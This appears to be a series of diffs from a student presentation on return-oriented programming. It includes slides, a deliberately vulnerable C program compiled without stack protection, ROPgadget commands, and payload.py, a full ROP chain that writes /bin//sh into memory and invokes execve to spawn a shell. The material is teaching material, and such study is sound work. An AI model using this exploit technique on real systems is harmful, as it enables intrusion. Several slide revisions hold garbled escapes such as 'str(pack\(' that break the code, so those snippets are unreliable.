 \end{frame}
+\subsection{Generating the payload}
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, writing /bin}
+    \frametitle{Generating the payload, writing /bin}
     \begin{lstlisting}[style=code, language=python]
@@
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, writing //sh}
+    \frametitle{Generating the payload, writing //sh}
     \begin{lstlisting}[style=code, language=python]
@@
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, init params}
+    \frametitle{Generating the payload, init params}
     \begin{lstlisting}[style=code, language=python]
@@
 \begin{frame}[fragile]
-    \frametitle{Working example: Putting it together, init params, syscall}
+    \frametitle{Generating the payload, init params, syscall}
     \begin{lstlisting}[style=code, language=python]
@@
     \begin{itemize}
-        \item Return Oriented Programming is a very powerful
+        \item Return Oriented Programming is a very powerful technique
         \item It is able to execute any system call if there are enough rop gadgets
@@
 
-\section{Sources}
+\section*{Sources}
 \begin{frame}

### 2023-02-10 presentation.tex
changes

--- 2022-06-20 RetOriProg_Maximilian_Heim.tex
@@
 %\setbeamertemplate{navigation symbols}{} 
-\logo{\includegraphics[width=0.1\textwidth]{logo.png}}
+\logo{ 
+    \includegraphics[width=0.09\textwidth]{./img/logo.png}
+}
 \institute{University Albstadt-Sigmaringen} 
@@
         \centering
-        \includegraphics[width=0.8\textwidth]{gadget.png}\label{gadget}
+        \includegraphics[width=0.8\textwidth]{./img/gadget.png}\label{gadget}
     \end{figure}
@@
     \end{itemize}
-    \begin{Verbatim}
+\begin{lstlisting}[style=result]
     POP eax; ret;
-    \end{Verbatim}
+\end{lstlisting}
     \begin{itemize}
@@
     \end{itemize}
-    \begin{Verbatim}
+\begin{lstlisting}[style=result]
 XOR r14, r14; pop r12; XOR r14, r12; ret;
-    \end{Verbatim}
+\end{lstlisting}
 \end{frame}
@@
     \end{itemize}
-    \begin{Verbatim}
+\begin{lstlisting}[style=result]
 mov [rax], rxc; ret;
-    \end{Verbatim}
+\end{lstlisting}
     \begin{itemize}
@@
     \end{itemize}
-    \begin{Verbatim}
+\begin{lstlisting}[style=result]
 mov rax, [rxc]; ret;
-    \end{Verbatim}
+\end{lstlisting}
     \begin{itemize}
@@
     \end{itemize}
-    \begin{Verbatim}
+\begin{lstlisting}[style=result]
 int 0x80; ret;
-    \end{Verbatim}
+\end{lstlisting}
 \end{frame}
@@
         \centering
-        \includegraphics[width=0.18\textwidth]{gadgetstack.png}\label{gadget2}
+        \includegraphics[width=0.18\textwidth]{./img/gadgetstack.png}\label{gadget2}
     \end{figure}
@@
 \subsection{Target Program}
-\begin{frame}[fragile]
+\begin{frame}
     \frametitle{Target Program and compilation}
-    \begin{itemize}
-        \item We compile the following program with stack protectors turned off
-    \end{itemize}
     %\begin{lstlisting}[breaklines, style=commandline]
@@
     %\end{lstlisting}
-    \begin{lstlisting}[style=code, language=c]
-#include <stdio.h>
-#include <string.h>
-int main(int argc, char *argv[])
-{
-    char buffer[8] = {0};
-    if(argc != 2)
-    {
-        printf("A single argument is required.\n");
-        return 1;
-    }
-    strcpy(buffer, argv[1]);
-    return 0;
-}
-    \end{lstlisting}
+    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
 \end{frame}
 \subsection{General approach}
-\begin{frame}
+\begin{frame}[fragile]
     \frametitle{Spawning a shell: Approach}

### 2023-02-10 vuln.c

@@ -1,19 +1,14 @@
+#include <mqueue.h>
 #include <stdio.h>
 #include <string.h>
 #include <threads.h>
-#include <mqueue.h>
 
- 
-int main(int argc, char *argv[])
-{
-    char buffer[8] = {0};
- 
-    if(argc != 2)
-    {
-        printf("A single argument is required.\n");
-        return 1;
-    }
- 
-    strcpy(buffer, argv[1]);
-    return 0;
+int main(int argc, char *argv[]) {
+  char buffer[8] = {0};
+  if (argc != 2) {
+    printf("A single argument is required.\n");
+    return 1;
+  }
+  strcpy(buffer, argv[1]);
+  return 0;
 }

### 2023-02-10 presentation.tex
changes

@@
     \frametitle{Target Program and compilation}
-    %\begin{lstlisting}[breaklines, style=commandline]
-%clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
-    %\end{lstlisting}
+    \begin{lstlisting}[breaklines, style=commandline]
+clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
+    \end{lstlisting}
+
     \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
@@
 
+\section*{Appendix}
+\subsection*{Proof that ROP is Turing Complete}
+\begin{frame}
+    \frametitle{Proof that ROP is Turing Complete}
+    What is turing completeness? \url{https://en.wikipedia.org/wiki/Turing_completeness}
+    Refer to proof from \url{https://drwho.virtadpt.net/files/mov.pdf} that x86 MOV itself is turing complete, from that we can conclude that mov, with access to the pop instruction is enough to make ROP itself turing complete.
+\end{frame}
+
 \end{document}

### 2023-02-10 payload.py

@@ -1,19 +1,19 @@
 from struct import pack
  
 # Padding goes here
-p = 'AAAABBBBCCCC'
+p = b'AAAABBBBCCCC'
  
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
 p += pack('<I', 0x080f0f6c) # @ .data
 p += pack('<I', 0x00000000) # @ NULL
 p += pack('<I', 0x080b526a) # pop eax ; ret
-p += '/bin'
+p += b'/bin'
 p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
 p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
 p += pack('<I', 0x080f0f70) # @ .data + 4
 p += pack('<I', 0x00000000) # @ NULL
 p += pack('<I', 0x080b526a) # pop eax ; ret
-p += '//sh'
+p += b'//sh'
 p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
 p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
 p += pack('<I', 0x080f0f74) # @ .data + 8
@@ -40,4 +40,4 @@ p += pack('<I', 0x08082a9e) # inc eax ; ret
 p += pack('<I', 0x08082a9e) # inc eax ; ret
 p += pack('<I', 0x08082a9e) # inc eax ; ret
 p += pack('<I', 0x08049b2a) # int 0x80
-print p
+print(p)

### 2023-02-10 vuln.c

@@ -1,7 +1,5 @@
-#include <mqueue.h>
 #include <stdio.h>
 #include <string.h>
-#include <threads.h>
 
 int main(int argc, char *argv[]) {
   char buffer[8] = {0};

### 2023-02-10 compilation.sh
changes

@@ -1,0 +1,1 @@
+clang -o vuln vuln.c -m32 -fno-stack-protector -Wl,-z,relro,-z,now,-z -static

### 2023-02-10 presentation.tex
changes

@@
     \item Published by Hovav Shacham in 2007
-    \item Arised as a technique to counter security mechanisms (NX)
+    \item Arised as a technique to counter security mechanisms (NX\)\)
     \item Big binary $\rightarrow$ ROP is turing complete
@@
     \begin{enumerate}
-        \item Search the binary for gadgets: return (0xC3) bytes that contain useful instructions before
+        \item Search the binary for gadgets: return (0xC3\)\) bytes that contain useful instructions before
         \item Generate a list of these gadgets, called ROP chain
@@
         \item Gadgets are machine instructions that end on a return
-        \item Tools: ROPgadget (\url{https://github.com/JonathanSalwan/ROPgadget}), ropper (\url{https://github.com/sashs/Ropper}), Radare2, pwntools....
+        \item Tools: ROPgadget (\url{https://github.com/JonathanSalwan/ROPgadget}\)\), ropper (\url{https://github.com/sashs/Ropper}\)\), Radare2, pwntools....
     \end{itemize}
@@
         \item These allow us to write arbitrary values into registers
-        \item However, sometimes we do not find a pop into our desired register (e.g. r14), here we can improvise and use something like
+        \item However, sometimes we do not find a pop into our desired register (e.g. r14\)\), here we can improvise and use something like
     \end{itemize}
@@
 \section{Example: Open a shell}
-\subsection{Target Program}
-\begin{frame}
-    \frametitle{Target Program and compilation}
-    \begin{lstlisting}[breaklines, style=commandline]
-clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
-    \end{lstlisting}
-
-    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
+\subsection{Target Program and Compilation}
+\begin{frame}[fragile]
+    \frametitle{Target Program and Compliation}
+    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off\)\)}{targetprogram}
+    \bltCommand{compilation.sh}{Compilation command}{comp}
 \end{frame}
@@
         \begin{enumerate}
-            \item write /bin/sh into memory (at the data segment)
-            \item init systemcall number (11)
-            \item init systemcall argument (address of /bin//sh)
+            \item write /bin/sh into memory (at the data segment\)\)
+            \item init systemcall number (11\)\)
+            \item init systemcall argument (address of /bin//sh\)\)
             \item call systemcall
@@
 p = 'AAAABBBBCCCC'
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f6c) # @ .data
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
+p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f6c\)\) # @ .data
+p += str(pack\('<I', 0x00000000\)\) # @ NULL
+p += str(pack\('<I', 0x080b526a\)\) # pop eax ; ret
 p += '/bin'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
     \end{lstlisting}
@@
     \begin{lstlisting}[style=code, language=python]
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f70) # @ .data + 4
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
+p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f70\)\) # @ .data + 4
+p += str(pack\('<I', 0x00000000\)\) # @ NULL
+p += str(pack\('<I', 0x080b526a\)\) # pop eax ; ret
 p += '//sh'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
     \end{lstlisting}
@@
 # write null byte after /bin/sh
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f74\)\) # @ .data + 8
+p += str(pack\('<I', 0x00000000\)\) # @ NULL
+p += str(pack\('<I', 0x080506c0\)\) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
 # write address of /bin/sh to ebx
-p += pack('<I', 0x08049022) # pop ebx ; ret
-p += pack('<I', 0x080f0f6c) # @ .data
+p += str(pack\('<I', 0x08049022\)\) # pop ebx ; ret
+p += str(pack\('<I', 0x080f0f6c\)\) # @ .data
 # arguments and environment to ecx,edx
-p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x0805e64f\)\) # pop ecx; add al, 0xf6; ret;
+p += str(pack\('<I', 0x080f0f74\)\) # @ .data + 8
+p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f74\)\) # @ .data + 8
+p += str(pack\('<I', 0x00000000\)\) # @ NULL
     \end{lstlisting}
@@
     \begin{lstlisting}[style=code, language=python]
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08049b2a) # int 0x80
+p += str(pack\('<I', 0x080506c0\)\) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
+p += str(pack\('<I', 0x08049b2a\)\) # int 0x80
 print p

### 2023-02-10 payload.py

@@ -1,43 +1,43 @@
 from struct import pack
  
 # Padding goes here
-p = b'AAAABBBBCCCC'
+p = 'AAAABBBBCCCC'
  
-p += pack('I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f6c) # @ .data
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
-p += b'/bin'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f70) # @ .data + 4
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
-p += b'//sh'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x08049022) # pop ebx ; ret
-p += pack('<I', 0x080f0f6c) # @ .data
-p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
[…]

### 2023-02-10 presentation.tex
changes

--- 2023-02-10 presentation.tex
@@
 \section{Example: Open a shell}
-\subsection{Target Program}
-\begin{frame}
-    \frametitle{Target Program and compilation}
-    \begin{lstlisting}[breaklines, style=commandline]
-clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
-    \end{lstlisting}
-
+\subsection{Target Program and Compilation}
+\begin{frame}[fragile]
+    \frametitle{Target Program and Compliation}
     \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
+    \bltCommand{compilation.sh}{Compilation command}{comp}
 \end{frame}
@@
 p = 'AAAABBBBCCCC'
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f6c) # @ .data
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f6c) # @ .data
+p += str(pack\('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x080b526a) # pop eax ; ret
 p += '/bin'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
     \end{lstlisting}
@@
     \begin{lstlisting}[style=code, language=python]
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f70) # @ .data + 4
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f70) # @ .data + 4
+p += str(pack\('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x080b526a) # pop eax ; ret
 p += '//sh'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
     \end{lstlisting}
@@
 # write null byte after /bin/sh
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f74) # @ .data + 8
+p += str(pack\('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
 # write address of /bin/sh to ebx
-p += pack('<I', 0x08049022) # pop ebx ; ret
-p += pack('<I', 0x080f0f6c) # @ .data
+p += str(pack\('<I', 0x08049022) # pop ebx ; ret
+p += str(pack\('<I', 0x080f0f6c) # @ .data
 # arguments and environment to ecx,edx
-p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
+p += str(pack\('<I', 0x080f0f74) # @ .data + 8
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f74) # @ .data + 8
+p += str(pack\('<I', 0x00000000) # @ NULL
     \end{lstlisting}
@@
     \begin{lstlisting}[style=code, language=python]
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08049b2a) # int 0x80
+p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08049b2a) # int 0x80
 print p

### 2023-02-10 payload.py

@@ -3,41 +3,41 @@ from struct import pack
 # Padding goes here
 p = 'AAAABBBBCCCC'
  
-p += str(pack('<I', 0x080958b5\)\)\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f6c\)\) # @ .data
-p += pack('<I', 0x00000000\)\) # @ NULL
-p += pack('<I', 0x080b526a\)\) # pop eax ; ret
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f6c) # @ .data
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080b526a) # pop eax ; ret
 p += '/bin'
-p += pack('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f70\)\) # @ .data + 4
-p += pack('<I', 0x00000000\)\) # @ NULL
-p += pack('<I', 0x080b526a\)\) # pop eax ; ret
+p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += pack('<I', 0x080f0f70) # @ .data + 4
+p += pack('<I', 0x00000000) # @ NULL
+p += pack('<I', 0x080b526a) # pop eax ; ret
 p += '//sh'
-p += pack('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74\)\) # @ .data + 8
-p += pack('<I', 0x00000000\)\) # @ NULL
-p += pack('<I', 0x080506c0\)\) # xor eax, eax ; ret
-p += pack('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x08049022\)\) # pop ebx ; ret
-p += pack('<I', 0x080f0f6c\)\) # @ .data
-p += pack('<I', 0x0805e64f\)\) # pop ecx; add al, 0xf6; ret;
[…]

### 2023-02-10 payload.py
changes

@@ -3,41 +3,41 @@ from struct import pack
 # Padding goes here
 p = 'AAAABBBBCCCC'
  
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f6c) # @ .data
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
+p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack('<I', 0x080f0f6c)) # @ .data
+p += str(pack('<I', 0x00000000)) # @ NULL
+p += str(pack('<I', 0x080b526a)) # pop eax ; ret
 p += '/bin'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f70) # @ .data + 4
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080b526a) # pop eax ; ret
+p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
+p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack('<I', 0x080f0f70)) # @ .data + 4
+p += str(pack('<I', 0x00000000)) # @ NULL
+p += str(pack('<I', 0x080b526a)) # pop eax ; ret
 p += '//sh'
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
-p += pack('<I', 0x00000000) # @ NULL
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-p += pack('<I', 0x08049022) # pop ebx ; ret
-p += pack('<I', 0x080f0f6c) # @ .data
-p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
-p += pack('<I', 0x080f0f74) # @ .data + 8
[…]

### 2023-02-10 presentation.tex
changes

@@
     \begin{itemize}
-    \item A type attack that exploits buffer overruns
-    \item Published by Hovav Shacham in 2007
+    \item A type of attack that exploits buffer overruns
     \item Arised as a technique to counter security mechanisms (NX)
+    \item Research by Hovav Shacham et al in 2007 - "When good instructions go bad: generalizing return-oriented programming to RISC"
+    \item Blackhat conference 2008, Hovav Shacham - "Return-oriented Programming:
+    Exploitation without Code Injection" \url{https://hovav.net/ucsd/talks/blackhat08.html}
+    \item Paper published by Ryan Roemer, Erik Buchanan, Hovav Shacham and Stefan Savage in 2012 - "Return-Oriented Programming: Systems, Languages, and Applications" 
     \item Big binary $\rightarrow$ ROP is turing complete
@@
     \end{figure}
+\end{frame}
+
+\section{How to find suitable Gadgets?}
+\begin{frame}
+    \begin{itemize}
+    \item Search gadgets
+    \end{itemize}
+    \bltCommand{ropcommand.sh}{Dumping Gadgets}{dumpgadget}
+    \begin{itemize}
+        \item 34011 Gadgets - 716,056 kB binary
+        \item Most of them are not very useful but the sheer size makes it likely we have suitable candidates, using regular expressions we can find suitable candidates fast
+        \item Example 1: pop edx $\rightarrow$ \regex{\^{}.* pop edx ; .*ret}
+        \item Example 2: int 0x80 $\rightarrow$ \regex{\^{}.* int 0x80}
+        \item Example 3: xor eax, eax $\rightarrow$ \regex{\^{}.* xor eax, eax ; .*ret}
+    \end{itemize}
 \end{frame}

### 2023-02-10 payload.py

@@ -1,32 +1,33 @@
 from struct import pack
  
+data = 0x080e5010
 # Padding goes here
 p = 'AAAABBBBCCCC'
  
-p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack('<I', 0x080f0f6c)) # @ .data
-p += str(pack('<I', 0x00000000)) # @ NULL
+p += str(pack('<I', 0x0808b285)) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack('<I', data)) # @ .data
+p += str(pack('<I', 0x11111111)) # @ NULL
 p += str(pack('<I', 0x080b526a)) # pop eax ; ret
 p += '/bin'
 p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
 p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack('<I', 0x080f0f70)) # @ .data + 4
-p += str(pack('<I', 0x00000000)) # @ NULL
+p += str(pack('<I', data + 4)) # @ .data + 4
+p += str(pack('<I', 0x11111111)) # @ NULL
 p += str(pack('<I', 0x080b526a)) # pop eax ; ret
 p += '//sh'
 p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
 p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack('<I', 0x080f0f74)) # @ .data + 8
-p += str(pack('<I', 0x00000000)) # @ NULL
+p += str(pack('<I', data + 8)) # @ .data + 8
+p += str(pack('<I', 0x11111111)) # @ NULL
 p += str(pack('<I', 0x080506c0)) # xor eax, eax ; ret
 p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
 p += str(pack('<I', 0x08049022)) # pop ebx ; ret
-p += str(pack('<I', 0x080f0f6c)) # @ .data
+p += str(pack('<I', data)) # @ .data
 p += str(pack('<I', 0x0805e64f)) # pop ecx; add al, 0xf6; ret;
-p += str(pack('<I', 0x080f0f74)) # @ .data + 8
+p += str(pack('<I', data + 8)) # @ .data + 8
[…]

### 2023-02-10 ropcommand.sh

@@ -1,0 +1,1 @@
+ROPgadget --binary vuln > gadgets

### 2023-02-11 presentation.tex
changes

@@
 \begin{frame}
+    \frametitle{How to find suitable Gadgets?}
     \begin{itemize}
-    \item Search gadgets
+    \item Multiple methods, using the tools directly you can search gadgets of your liking, but we can also dump them into a file and search using regular expressions.
     \end{itemize}
@@
     \begin{itemize}
-        \item 34011 Gadgets - 716,056 kB binary
-        \item Most of them are not very useful but the sheer size makes it likely we have suitable candidates, using regular expressions we can find suitable candidates fast
-        \item Example 1: pop edx $\rightarrow$ \regex{\^{}.* pop edx ; .*ret}
-        \item Example 2: int 0x80 $\rightarrow$ \regex{\^{}.* int 0x80}
-        \item Example 3: xor eax, eax $\rightarrow$ \regex{\^{}.* xor eax, eax ; .*ret}
+        \item Most of them are not very useful because they are very specific, amount compensates for that 716 kB binary $\rightarrow$ 34011 Gadgets
+        \item Example 1: pop edx $\rightarrow$ \regex{\^{}.\{0,10\}pop edx ;.\{0,10\}ret}
+        \item Example 2: int 0x80 $\rightarrow$ \regex{\^{}.\{0,10\}int 0x80}
+        \item Example 3: xor eax, eax $\rightarrow$ \regex{\^{}.\{0,10\}xor eax, eax ;.\{0,10\}ret}
     \end{itemize}
@@
     \begin{itemize}
-        \item Using ropper we can find our desired gadgets
+        \item Using ROPgadget we can find our desired gadgets
         \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
@@
         \end{enumerate}
+        \item All of this has to be done using Bytes that are not \Verb+\\0x00+ because thats the character used for identifying the end of a string.
     \end{itemize}

### 2023-02-11 paper.tex
changes

--- 2022-04-09 ret_oriented_prog.tex
@@
-\documentclass[10pt,a4paper,twocolumn]{article}
-\usepackage[utf8]{inputenc}
-\usepackage[english]{babel}
-\usepackage{amsmath}
-\usepackage{amsfonts}
-\usepackage{amssymb}
+%%%% IACR Transactions TEMPLATE %%%%
+% This file shows how to use the iacrtrans class to write a paper.
+% Written by Gaetan Leurent gaetan.leurent@inria.fr (2020)
+% Public Domain (CC0)
+
+%%%% 1. DOCUMENTCLASS %%%%
+\documentclass[journal=tosc,submission]{iacrtrans}
